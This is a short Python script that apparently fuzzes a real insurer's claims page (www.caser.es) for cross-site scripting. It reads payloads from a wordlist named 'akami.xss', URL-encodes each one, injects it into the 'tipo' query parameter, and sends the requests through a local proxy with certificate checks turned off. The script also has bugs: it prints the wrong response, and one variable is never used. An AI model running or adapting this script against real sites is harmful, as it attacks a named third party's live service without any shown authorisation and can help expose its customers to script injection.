import requests
import urllib.parse
import os

# Set the HTTPS proxy environment variable
os.environ['https_proxy'] = 'http://127.0.0.1:8080'

# Step 1: Read multiple URLs from a file and fetch cookies for each
with open("/Users/ayush/wordlists/akami.xss", "r") as file:
    urls = [line.strip() for line in file.readlines()]

for url in urls:
    if url:  # Ensure the line is not empty
        url = urllib.parse.quote(url)
        session = requests.Session()
        response = session.get("https://www.caser.es",proxies={"http": os.environ['https_proxy'], "https": os.environ['https_proxy']}, verify=False)
        # Copy cookies from the response
        cookies = session.cookies
        print(f"\nCookies fetched from {url}:")
        for cookie in cookies:
            print(f"{cookie.name}: {cookie.value}")

        next_url = "https://www.caser.es?next"
        response_next = session.get("https://www.caser.es/ecliente/comunicar-parte-hogar-resto?p_myurl=%252Fgroup%252Farea-cliente%252Fsiniestros&tipo="+url,proxies={"http": os.environ['https_proxy'], "https": os.environ['https_proxy']}, verify=False)

        print("\nStatus Code for the URL:", response.status_code)
        print("Response Content:")
        print(response.text[:500])  # Print first 500 characters of the response

